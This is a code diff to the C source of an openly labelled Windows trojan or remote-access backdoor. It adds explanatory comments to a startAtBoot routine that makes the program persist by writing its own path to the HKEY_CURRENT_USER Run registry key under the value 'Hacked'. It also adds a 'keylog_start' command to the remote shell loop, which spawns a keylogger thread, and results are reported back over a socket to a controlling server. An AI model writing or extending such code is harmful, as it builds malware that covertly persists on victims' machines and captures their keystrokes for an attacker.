@@ -25,7 +25,12 @@
 
 int sock;
 
-// STORES THE PROGRAM IN REGISTRY SO IT CAN BEBOOTED AT START (REG_VAL = "HACKED")
+// STORES THE PROGRAM IN REGISTRY SO IT CAN BEBOOTED AT START (REG_VAL = "HACKED")\
+// TCHAR to set variable to store path and to get the path of the trojan
+// use keyword HKEY--> Creates the registry key value, this is used to make a register key in the registery
+//--> set registery entry in HK_CURRENT_USER
+
+
 int startAtBoot() {
 
     char err[128] = "[-] failed to add program to registry \n";
@@ -34,27 +39,29 @@ int startAtBoot() {
     TCHAR szPath[MAX_PATH]; // buffer to store the path
     DWORD pathLen = 0; // length of the path
 
+    // get programs pathname, return to server err if path <= 0 or == 0
     pathLen = GetModuleFileName(NULL, szPath, MAX_PATH); // get the path of the program
+    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
+
     if (pathLen == 0) {
         send(sock, err, sizeof(err), 0);
         return -1;
     }
 
-    // open the registry key, if it fails, send an error message, then set value to the path of the program
+    // call RegOpenKey and open the registry key, if it fails, send an error message,  IF PASS then set value to the path of the program
     HKEY NewVal;
     if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
         send(sock, err, sizeof(err), 0);
         return -1;
     }
 
-    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
+    // check for function RegSetValue; if value,
+    // set new registery value as var 'NewVal', with an entry text named "Hacked", as registry type 'REG_SZ'
     if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
         RegCloseKey(NewVal);
         send(sock, err, sizeof(err), 0);
         return -1;
     }
-
-
     RegCloseKey(NewVal);
     send(sock, suc, sizeof(suc), 0);
     return 0;
@@ -121,6 +128,12 @@ void Shell() // function to execute the command and send the output to the serve
             }
         else if (strncmp("persist", buffer, 7) == 0) {
             startAtBoot(); // start the client at boot
+        }
+
+        // create a thread handle and call "keylogger.g" function "logg"
+        else if (strncmp("keylog_start", buffer, 12)==0) {
+            HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0,NULL);
+            goto jump;
         }
 
         else if (strncmp("ls ", buffer, 3) == 0) {
